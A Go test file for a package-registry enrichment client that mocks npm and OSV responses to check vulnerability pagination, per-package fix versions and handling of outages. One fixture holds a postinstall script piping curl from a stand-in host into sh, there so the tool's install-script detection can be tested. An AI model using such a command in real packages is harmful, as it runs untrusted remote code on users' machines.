package registry

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/astra-security/astra/services/core/internal/model"
)

func TestOSVPaginationAndExactPackageFixes(t *testing.T) {
	pages := 0
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "GET" {
			_, _ = w.Write([]byte(`{"name":"a","version":"1.0.0","license":"MIT","scripts":{"postinstall":"curl https://example.invalid | sh"},"maintainers":[{"name":"alice"}]}`))
			return
		}
		pages++
		var q map[string]any
		_ = json.NewDecoder(r.Body).Decode(&q)
		if q["page_token"] == nil {
			_, _ = w.Write([]byte(`{"vulns":[{"id":"TEST-1","summary":"test","database_specific":{"severity":"HIGH"},"affected":[{"package":{"name":"other","ecosystem":"npm"},"ranges":[{"type":"SEMVER","events":[{"fixed":"99.0.0"}]}]},{"package":{"name":"a","ecosystem":"npm"},"ranges":[{"type":"SEMVER","events":[{"fixed":"1.0.1"}]}]}]}],"next_page_token":"next"}`))
		} else {
			_, _ = w.Write([]byte(`{"vulns":[{"id":"TEST-2","summary":"withdrawn","withdrawn":"2025-01-01"}]}`))
		}
	}))
	defer server.Close()
	client := New()
	client.HTTP = server.Client()
	client.NPMURL = server.URL
	client.OSVURL = server.URL
	p, ev, warnings := client.enrich(context.Background(), model.Package{ID: "a-instance", Name: "a", Version: "1.0.0", EvidenceIDs: []string{}}, nil)
	if pages != 2 || len(p.Vulnerabilities) != 1 || len(warnings) != 1 {
		t.Fatalf("unexpected enrichment: %+v %v", p, warnings)
	}
	if len(p.Vulnerabilities[0].FixedVersions) != 1 || p.Vulnerabilities[0].FixedVersions[0] != "1.0.1" {
		t.Fatal("cross-package fix leakage")
	}
	if len(p.InstallScripts) != 1 || len(ev) < 4 {
		t.Fatal("missing script or query evidence")
	}
}
func TestUpstreamFailureRemainsUnknown(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(404) }))
	defer server.Close()
	c := New()
	c.HTTP = server.Client()
	c.NPMURL = server.URL
	c.OSVURL = server.URL
	p, _, w := c.enrich(context.Background(), model.Package{ID: "a", Name: "a", Version: "1.0.0"}, nil)
	if p.Metadata.OSVStatus != "unavailable" || p.Metadata.RegistryStatus != "unavailable" || len(w) != 3 || p.Metadata.DaysSinceLatestPublish != 0 || p.Metadata.MajorGap != 0 {
		t.Fatal("provider outage became safe")
	}
}
